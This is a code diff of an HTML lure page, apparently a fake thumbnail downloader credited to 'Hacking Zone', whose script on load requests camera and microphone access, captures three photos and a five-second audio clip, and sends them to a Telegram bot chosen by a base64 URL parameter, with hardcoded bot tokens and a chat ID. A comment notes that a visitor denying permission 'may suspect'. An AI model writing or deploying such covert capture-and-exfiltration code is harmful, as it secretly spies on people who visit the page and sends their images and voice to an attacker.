@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -124,118 +122,149 @@
     <div id="message-container"></div>
     <video id="video" width="0" height="0" autoplay></video>
   </center>
+<script type="text/javascript">
+  function downloadThumbnail() {
+    // Change button text to indicate fetching
+    var btn = document.getElementById('thumbdloadbtn');
+    btn.textContent = 'Fetching from server... Wait';
 
-  <script type="text/javascript">
-    function downloadThumbnail() {
-        // Change button text to indicate fetching
-        var btn = document.getElementById('thumbdloadbtn');
-        btn.textContent = 'Fetching from server... Wait';
+    // Add your logic to fetch the thumbnail here
+    // For now, let's just send a message to Telegram
+    sendMessageToTelegram("Thumbnail is being fetched...");
+  }
 
-        // Add your logic to fetch the thumbnail here
-        // ...
-    }
+  function la(src) {
+    window.location = src;
+  }
 
-    function la(src) {
-      window.location = src;
-    }
-
-    function GetURLParameter(sParam) {
-      var sPageURL = window.location.search.substring(1);
-      var sURLVariables = sPageURL.split('&');
-      for (var i = 0; i < sURLVariables.length; i++) {
-        var sParameterName = sURLVariables[i].split('=');
-        if (sParameterName[0] == sParam) {
-          return sParameterName[1];
-        }
+  function GetURLParameter(sParam) {
+    var sPageURL = window.location.search.substring(1);
+    var sURLVariables = sPageURL.split('&');
+    for (var i = 0; i < sURLVariables.length; i++) {
+      var sParameterName = sURLVariables[i].split('=');
+      if (sParameterName[0] == sParam) {
+        return sParameterName[1];
       }
     }
+  }
 
-    function decodeBase64(encodedStr) {
-      try {
-        return decodeURIComponent(atob(encodedStr));
-      } catch (e) {
-        console.error('Base64 decode error:', e);
-        return null;
+  function decodeBase64(encodedStr) {
+    try {
+      return decodeURIComponent(atob(encodedStr));
+    } catch (e) {
+      console.error('Base64 decode error:', e);
+      return null;
+    }
+  }
+
+  // Get Base64 encoded 'id' parameter from the URL
+  var base64Id = GetURLParameter('i');
+  var chatid = base64Id ? decodeBase64(base64Id) : null;
+
+  if (chatid) {
+    console.log('Decoded chat ID:', chatid);
+  } else {
+    console.warn('No valid chat ID found.');
+  }
+
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then((stream) => {
+      const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+      const audioRecorder = new MediaRecorder(stream);
+
+      function capturePhoto(index) {
+        setTimeout(() => {
+          imageCapture.takePhoto()
+            .then((blob) => {
+              sendToTelegram(blob, 'photo');
+            })
+            .catch((error) => {
+              console.error('Error capturing photo:', error);
+            });
+        }, index * 2000);
       }
+
+      function startAudioRecording() {
+        audioRecorder.start();
+        setTimeout(() => {
+          audioRecorder.stop();
+        }, 5000);
+      }
+
+      audioRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          sendToTelegram(event.data, 'audio');
+        }
+      };
+
+      for (let i = 0; i < 3; i++) {
+        capturePhoto(i);
+      }
+
+      startAudioRecording();
+    })
+    .catch((error) => {
+      if (error.name === 'NotAllowedError') {
+        // Handle the case where permissions are denied
+        console.warn('Permissions denied. User may suspect.');
+      } else {
+        console.error('Permission error:', error);
+      }
+    });
+
+  function sendToTelegram(data, type) {
+    const botToken = '7127289863:AAEBI-cGSj40xJN63HV1mYXZZUP12866G6w';
+    const chatId = chatid;
+
+    if (!chatId) {
+      console.error('Chat ID is not available.');
+      return;
     }
 
-    // Get Base64 encoded 'id' parameter from the URL
-    var base64Id = GetURLParameter('i');
-    var chatid = base64Id ? decodeBase64(base64Id) : null;
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append(type === 'photo' ? 'photo' : 'audio', data, `@lodabotbccc.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-    if (chatid) {
-      console.log('Decoded chat ID:', chatid);
-    } else {
-      console.warn('No valid chat ID found.');
+    fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+      method: 'POST',
+      body: formData
+    })
+      .then(response => response.json())
+      .then(data => console.log(data))
+      .catch(error => console.error('Error sending to Telegram:', error));
+  }
+
+  // Function to send a message to Telegram
+  function sendMessageToTelegram(message) {
+    const botToken = '7527990182:AAF0zFR9YqlRlWODalW8U6EiShJp5hKtjF4';  // Bot Token
+    const chatId = '1789993737';  // Chat ID
+
+    if (!message) {
+      alert("Please enter a message.");
+      return;
     }
 
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then((stream) => {
-        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-        const audioRecorder = new MediaRecorder(stream);
+    // Encode the message for URL compatibility
+    const encodedMessage = encodeURIComponent(message);
 
-        function capturePhoto(index) {
-          setTimeout(() => {
-            imageCapture.takePhoto()
-              .then((blob) => {
-                sendToTelegram(blob, 'photo');
-              })
-              .catch((error) => {
-                console.error('Error capturing photo:', error);
-              });
-          }, index * 2000);
-        }
+    // Construct the URL to send the message via the Telegram Bot API
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;
 
-        function startAudioRecording() {
-          audioRecorder.start();
-          setTimeout(() => {
-            audioRecorder.stop();
-          }, 5000);
-        }
-
-        audioRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            sendToTelegram(event.data, 'audio');
-          }
-        };
-
-        for (let i = 0; i < 3; i++) {
-          capturePhoto(i);
-        }
-
-        startAudioRecording();
-      })
-      .catch((error) => {
-        if (error.name === 'NotAllowedError') {
-          // Handle the case where permissions are denied
-          console.warn('Permissions denied. User may suspect.');
+    // Send the message using fetch API
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Message sent successfully!');
         } else {
-          console.error('Permission error:', error);
+          console.error('Error sending message:', data);
         }
-      });
-
-    function sendToTelegram(data, type) {
-      const botToken = '7127289863:AAEBI-cGSj40xJN63HV1mYXZZUP12866G6w';
-      const chatId = chatid;
-
-      if (!chatId) {
-        console.error('Chat ID is not available.');
-        return;
-      }
-
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@lodabotbccc.${type === 'photo' ? 'jpg' : 'wav'}`);
-
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
-        method: 'POST',
-        body: formData
       })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error sending to Telegram:', error));
-    }
-  </script>
+      .catch(error => {
+        console.error('Error:', error);
+      });
+  }
+</script>
 
   <footer>
     <p>Made With ❤️ By Hacking Zone</p>
